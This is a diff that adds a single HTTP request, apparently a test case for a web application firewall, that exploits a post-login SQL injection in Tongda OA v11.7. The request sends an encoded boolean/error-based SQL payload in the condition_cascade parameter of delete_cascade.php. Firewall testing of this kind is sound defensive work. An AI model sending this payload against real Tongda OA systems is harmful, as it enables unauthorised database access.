@@ -1,0 +1,13 @@
+# 利用【通达OA v11.7 后台sql注入漏洞】-30000450
+# 通达OA v11.7某处参数存在sql注入漏洞，登录成功后，攻击者可以通过该漏洞拿下数据库。
+GET /general/hr/manage/query/delete_cascade.php?acid=30000450&condition_cascade=select%2520if%28%281=1%29%2C1%2Cpower%289999%2C99%29%29&bid=hd_tag_m8mv26mv HTTP/1.1
+Host: www.swaf.com
+Cookie: Set_Cookie
+RM-PRO-BusinessID: hd_tag_m8mv26mv
+RM-PRO-Token: 2f34b2dc78c9ff569be7f6ad89b2d8df
+RM-PRO-Time: 1742808638246
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML
+Accept-Encoding: gzip
+Accept-Language: zh-CN,zh;q=0.9
+
